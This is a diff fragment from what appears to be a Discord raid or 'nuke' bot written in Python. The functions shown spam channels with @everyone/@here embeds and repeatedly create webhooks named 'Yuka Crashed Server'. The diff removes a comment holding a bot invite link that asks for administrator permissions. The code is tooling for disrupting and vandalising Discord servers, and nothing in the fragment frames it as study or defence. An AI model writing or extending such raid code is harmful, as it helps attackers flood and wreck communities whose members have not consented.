@@ -96,7 +96,6 @@ async def spamth(channel: discord.TextChannel):
 
         await channel.send(embed=emb, content="@everyone @here")
 
-#https://discord.com/api/oauth2/authorize?client_id=945752718557982761&permissions=8&scope=bot
 async def spamhook(channel: discord.TextChannel):
     for i in range(5):
         await channel.create_webhook(name="Yuka Crashed Server")
